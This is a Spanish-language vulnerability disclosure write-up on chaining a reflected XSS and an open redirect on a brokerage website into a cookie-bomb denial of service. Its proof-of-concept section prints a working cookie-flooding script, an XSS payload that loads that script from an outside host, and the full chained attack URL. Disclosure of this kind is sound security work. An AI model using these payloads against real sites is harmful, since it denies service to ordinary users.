---
layout: content
title: 'Encadenamiento de vulnerabilidades client-side para generar indisponibilidad en una aplicación web'
description: 'Durante un análisis de la aplicación web de la corredora easynvest.com.br (adquirida por Nubank), se identificaron dos vulnerabilidades del lado del cliente que, al ser encadenadas, pueden comprometer la disponibilidad del servicio para usuarios legítimos. Específicamente, se observó la posibilidad de inducir una condición de Denial of Service (DoS) a partir de la explotación combinada de dichas fallas.'
og_image: https://heitorgouvea.me/images/publications/nuinvest/xss-triaged.png
---

Tabla de contenido
* [Resumen](#resumen)
* [Descripción](#descripción)
* [Prueba de concepto](#prueba-de-concepto)
* [Impacto](#impacto)
* [Conclusión](#conclusión)
* [Referencias](#referencias)

### Resumen

Durante un análisis de la aplicación web de la corredora easynvest.com.br (adquirida por Nubank), se identificaron dos vulnerabilidades del lado del cliente que, al ser encadenadas, pueden comprometer la disponibilidad del servicio para usuarios legítimos. Específicamente, se observó la posibilidad de inducir una condición de Denial of Service (DoS) mediante la explotación combinada de dichas fallas.

**Aviso**: La empresa responsable fue notificada de todos los detalles presentados en esta publicación en el menor tiempo posible y actuó de forma ética y transparente, demostrando compromiso y atención adecuados. Durante las pruebas realizadas, no se comprometió ni accedió a ningún sistema, y se llevaron a cabo acciones y modificaciones para mitigar cualquier posible uso indebido.


### Descripción

La aplicación analizada ofrece una funcionalidad para generar enlaces de invitación personalizados, con parámetros visibles en la URL, como en el siguiente ejemplo:

![Imagem](/images/publications/nuinvest/link-indique.png)

- [https://indique.easynvest.com.br?nome=heitor%20REDACTED&id=[NUMERICAL ID REDACTED]]()

![Imagem](/images/publications/nuinvest/site.png)

Al acceder al enlace, los parámetros proporcionados se reflejan directamente en la interfaz de usuario, lo que indica la posible presencia de una vulnerabilidad de tipo XSS reflejado ([1], [2]). Se identificó que el parámetro `?nome=` era vulnerable. El siguiente payload ilustra dicha explotación:

- [https://indique.easynvest.com.br/?nome=<audio src/onerror=alert(1)>&id=1]()

![Imagem](/images/publications/nuinvest/xss-triaged.png)

A pesar de la existencia de la vulnerabilidad, su explotación directa presenta limitaciones relevantes:

* El código vulnerable se encuentra en un subdominio, lo que impide el acceso al LocalStorage del dominio principal;
* Las cookies disponibles son accesibles, pero aquellas con información sensible están protegidas con la flag HTTPOnly;
* Se trata de un XSS del tipo reflejado, lo que dificulta su propagación automática;
* El dominio principal implementa mecanismos de seguridad primorosos, como tokens anti-CSRF y headers HTTP bien configuradas: `X-Frame-Options` (XFO), `Content Security Policy` (CSP) y `Cross-Origin Resource Sharing` (CORS).

Debido a estas limitaciones, se exploró otra vulnerabilidad que pudiera combinarse con el XSS para aumentar su impacto. El análisis del código JavaScript de la pantalla de autenticación reveló una vulnerabilidad de redirección abierta (Open Redirect) ([3], [4]):

- [https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com]()

Demo:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Este redireccionamiento no validado, ubicado en el dominio principal, permite propagar cargas maliciosas de forma más confiable, mitigando parcialmente las restricciones impuestas por el XSS reflejado. Sin embargo, los intentos de explotación con objetivos más críticos — como la toma de control de cuentas (Account Takeover), exfiltración de datos y ejecución de acciones sensibles — no tuvieron éxito debido a la implementación de autenticación multifactor (MFA) en operaciones de alto riesgo ([7]).

Ante estas restricciones, se evaluó un vector alternativo: el ataque conocido como **Cookie Bomb**, cuyo objetivo es hacer que la aplicación sea inaccesible para el usuario que accede a un enlace malicioso. Este ataque consiste en la inyección masiva de cookies con cargas excesivas, superando los límites que el servidor está preparado para procesar. Como resultado, las solicitudes posteriores del navegador comprometido pueden ser rechazadas, impidiendo que la aplicación cargue correctamente y generando así una condición de Denial of Service (DoS).

En términos generales, los navegadores permiten el envío de múltiples cookies, cada una con un tamaño máximo aproximado de 4KB. Sin embargo, los servidores pueden fallar al manejar este volumen excesivo de datos, resultando en indisponibilidad hasta que el usuario elimine manualmente las cookies o estas expiren.

Para una comprensión más profunda de esta técnica, se recomienda la lectura de los artículos: "Cookie Bomb or Let's Break the Internet" [9], de Egor Homakov, y "Denial of Service with Cookie Bomb" [10], de filedescriptor.

---

### Prueba de concepto

A continuación, se detalla la cadena de explotación:

1. Hospedaje de un script para creación masiva de cookies maliciosas:

```javascript
var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution   = Array(4000).join('a');

for (var i = 1; i < 99; i++) {
    document.cookie = 'bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
}

window.location = "https://" + document.domain;
```

- Hospedado en: https://heitorgouvea.me/public/payloads/bomb.js

2. Ejecución del código malicioso vía XSS reflejado:

- [https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1]()

3. Redirección del usuario al payload utilizando un servicio de acortamiento de URLs: 

- [https://cutt.ly/syPnJXp]()

Payload final: 

- [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()

Resultado:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie Bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

---

### Impacto

La explotación encadenada de estas vulnerabilidades permite que un atacante provoque la indisponibilidad de la aplicación web para usuarios específicos. Esto se logra mediante la inyección masiva de cookies (cookie pollution), que supera los límites aceptables para el servidor, impidiendo que la aplicación se cargue hasta que el usuario elimine manualmente las cookies maliciosas. Aunque este estudio se centró en un vector de impacto específico (DoS), podrían surgir otras posibilidades de explotación dependiendo de la configuración de la aplicación.

---

### Conclusión

La explotación descrita requiere un bajo esfuerzo técnico y operativo, pero puede generar un impacto significativo para o usuário final. La combinación de una vulnerabilidad de XSS reflejado con otra de redirección abierta permite ejecutar un ataque de Denial of Service basado en Cookie Bomb, un vector poco común pero efectivo en contextos específicos.

Tras el contacto con la empresa responsable, se adoptaron las siguientes medidas:

- No se implementó una corrección definitiva para la vulnerabilidad de Open Redirect;
- El XSS reflejado fue mitigado con reglas en el Web Application Firewall (WAF), aunque se identificaron formas de eludir esta protección. Se presentaron argumentos técnicos al respecto, sin recibir una respuesta concluyente hasta la fecha de publicación.

---

### Referencias

- [1] [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
- [2] [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
- [3] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [4] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [5] [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [6] [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [7] [https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [8] [https://en.wikipedia.org/wiki/HTTP_cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
- [9] [https://blog.innerht.ml/tag/cookie-bomb/](https://blog.innerht.ml/tag/cookie-bomb/)
- [10] [https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html](https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html)
